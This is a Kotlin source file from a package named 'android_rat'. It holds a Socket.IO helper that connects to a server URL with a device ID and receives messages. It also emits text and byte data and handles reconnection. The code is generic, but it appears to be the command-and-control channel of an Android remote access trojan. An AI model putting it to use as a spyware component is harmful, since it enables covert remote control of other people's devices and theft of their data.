package com.example.android_rat.utils

import android.content.Context
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import java.net.URISyntaxException

object WebSocketUtils {
    private lateinit var socket: Socket

    fun createWebSocket(
        context: Context,
        webSocketUrl: String,
        onOpenCallback: () -> Unit = {},
        onMessageCallback: (String) -> Unit = {},
        onErrorCallback: (Throwable) -> Unit = {},
        onClosingCallback: () -> Unit = {}
    ) {
        try {
            val options = IO.Options()
            val deviceId = DeviceMetadataUtils.getDeviceId()
            options.query = "device_id=$deviceId"
            socket = IO.socket(webSocketUrl, options)  // Pass the options object

            // Handle connection open event
            socket.on(Socket.EVENT_CONNECT) {
                Log.d("WebSocketUtils", "Socket.IO connection opened")
                onOpenCallback()
            }

            // Handle message event
            socket.on("message") { args ->
                Log.d("WebSocketUtils", "Message is received")
                if (args.isNotEmpty()) {
                    val message = args[0] as String
                    Log.d("WebSocketUtils", "Message received: $message")
                    onMessageCallback(message)
                }
            }

            // Handle error event
            socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                val error = args[0] as Throwable
                Log.e("WebSocketUtils", "Socket.IO connection failed: ${error.message}")
                onErrorCallback(error)
            }

            // Handle disconnect event
            socket.on(Socket.EVENT_DISCONNECT) {
                Log.d("WebSocketUtils", "Socket.IO connection closing")
                onClosingCallback()
            }

            // Connect to the server
            socket.connect()

        } catch (e: URISyntaxException) {
            Log.e("WebSocketUtils", "Socket.IO connection failed: ${e.message}")
            onErrorCallback(e)
        }
    }
    fun reconnect(
        context: Context,
        webSocketUrl: String,
        onOpenCallback: () -> Unit = {},
        onMessageCallback: (String) -> Unit = {},
        onErrorCallback: (Throwable) -> Unit = {},
        onClosingCallback: () -> Unit = {}
    ) {
        closeConnection()
        Log.d("WebSocketUtils", "Reconnecting...")
        createWebSocket(
            context = context,
            webSocketUrl = webSocketUrl,
            onOpenCallback = onOpenCallback,
            onMessageCallback = onMessageCallback,
            onErrorCallback = onErrorCallback,
            onClosingCallback = onClosingCallback
        )
    }




    fun emit(event: String, data: String) {
        if (this::socket.isInitialized) {
            Log.d("WebSocketUtils", "Emitting event: $event with $data")
            socket.emit(event, data)
        }
    }

    fun emitBytes(event: String, data: ByteArray) {
        if (this::socket.isInitialized) {
            socket.emit(event, data)
        }
    }

    fun closeConnection() {
        if (this::socket.isInitialized) {
            socket.disconnect()
            socket.close()
        }
    }
}
